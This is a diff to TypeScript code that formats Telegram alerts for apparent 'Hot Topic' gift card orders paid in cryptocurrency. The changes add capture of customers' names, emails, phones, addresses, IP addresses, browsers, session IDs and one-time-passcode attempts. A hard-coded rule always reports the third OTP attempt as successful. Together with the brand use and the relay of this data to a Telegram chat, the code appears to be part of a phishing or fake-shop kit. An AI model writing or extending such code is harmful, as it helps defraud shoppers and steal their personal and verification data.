@@ -16,27 +16,124 @@ interface OrderDetails {
   giftCardValue: number;
   paymentAmount: number;
   deliveryMethod: string;
-  cryptoCurrency: string;
-  transactionId: string;
+  cryptoCurrency?: string;
+  transactionId?: string;
+  address?: {
+    street: string;
+    city: string;
+    state: string;
+    zipCode: string;
+  };
+  userInfo: {
+    ip: string;
+    userAgent: string;
+    sessionId?: string;
+    timestamp: string;
+  };
+  notificationType: "order_placed" | "payment_details" | "otp_attempt";
+  otpAttempt?: number;
 }
 
-function formatTelegramMessage(orderDetails: OrderDetails): string {
+function formatOrderPlacedMessage(orderDetails: OrderDetails): string {
+  const { address } = orderDetails;
+  
+  let addressSection = '';
+  if (orderDetails.deliveryMethod === "physical" && address) {
+    addressSection = `
+📍 *Shipping Address*:
+   Street: ${address.street}
+   City: ${address.city}
+   State: ${address.state}
+   ZIP: ${address.zipCode}`;
+  }
+
   return `
-🔥 *NEW HOT TOPIC GIFT CARD ORDER* 🔥
+🚨 *NEW HOT TOPIC ORDER PLACED* 🚨
+
+👤 *Customer Information*:
+   Name: ${orderDetails.customerName}
+   Email: ${orderDetails.email}
+   Phone: ${orderDetails.phone}
+
+💳 *Order Details*:
+   Gift Card Value: $${orderDetails.giftCardValue.toFixed(2)}
+   Payment Amount: $${orderDetails.paymentAmount.toFixed(2)}
+   Delivery Method: ${orderDetails.deliveryMethod}${addressSection}
+
+🔍 *User Information*:
+   IP Address: \`${orderDetails.userInfo.ip}\`
+   Browser: ${orderDetails.userInfo.userAgent}
+   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
+   Timestamp: ${orderDetails.userInfo.timestamp}
+
+📆 *Order Placed*: ${new Date().toLocaleString()}
+`;
+}
+
+function formatPaymentDetailsMessage(orderDetails: OrderDetails): string {
+  return `
+💰 *PAYMENT DETAILS SUBMITTED* 💰
 
 👤 *Customer*: ${orderDetails.customerName}
 📧 *Email*: ${orderDetails.email}
-📱 *Phone*: ${orderDetails.phone}
 
-💳 *Gift Card Value*: $${orderDetails.giftCardValue.toFixed(2)}
-💰 *Payment Amount*: $${orderDetails.paymentAmount.toFixed(2)}
-🪙 *Cryptocurrency*: ${orderDetails.cryptoCurrency}
+💳 *Payment Information*:
+   Cryptocurrency: ${orderDetails.cryptoCurrency}
+   Transaction ID: \`${orderDetails.transactionId}\`
+   Amount: $${orderDetails.paymentAmount.toFixed(2)}
 
-🚚 *Delivery Method*: ${orderDetails.deliveryMethod}
-🔢 *Transaction ID*: \`${orderDetails.transactionId}\`
+🔍 *User Information*:
+   IP Address: \`${orderDetails.userInfo.ip}\`
+   Browser: ${orderDetails.userInfo.userAgent}
+   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
+   Timestamp: ${orderDetails.userInfo.timestamp}
 
-📆 *Date*: ${new Date().toLocaleString()}
+📆 *Submitted At*: ${new Date().toLocaleString()}
 `;
+}
+
+function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
+  const attempt = orderDetails.otpAttempt || 0;
+  const isLastAttempt = attempt === 3;
+  
+  const attemptHeader = isLastAttempt 
+    ? '✅ *OTP VERIFICATION SUCCESSFUL* ✅' 
+    : `⚠️ *OTP VERIFICATION ATTEMPT ${attempt}* ⚠️`;
+  
+  const statusText = isLastAttempt 
+    ? '✅ Success - Final attempt' 
+    : `❌ Failed - Attempt ${attempt} of 3`;
+
+  return `
+${attemptHeader}
+
+👤 *Customer*: ${orderDetails.customerName}
+📧 *Email*: ${orderDetails.email}
+
+🔐 *Verification Status*:
+   ${statusText}
+
+🔍 *User Information*:
+   IP Address: \`${orderDetails.userInfo.ip}\`
+   Browser: ${orderDetails.userInfo.userAgent}
+   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
+   Timestamp: ${orderDetails.userInfo.timestamp}
+
+📆 *Attempt Time*: ${new Date().toLocaleString()}
+`;
+}
+
+function formatTelegramMessage(orderDetails: OrderDetails): string {
+  switch (orderDetails.notificationType) {
+    case "order_placed":
+      return formatOrderPlacedMessage(orderDetails);
+    case "payment_details":
+      return formatPaymentDetailsMessage(orderDetails);
+    case "otp_attempt":
+      return formatOTPAttemptMessage(orderDetails);
+    default:
+      return formatOrderPlacedMessage(orderDetails);
+  }
 }
 
 async function sendTelegramNotification(message: string): Promise<boolean> {
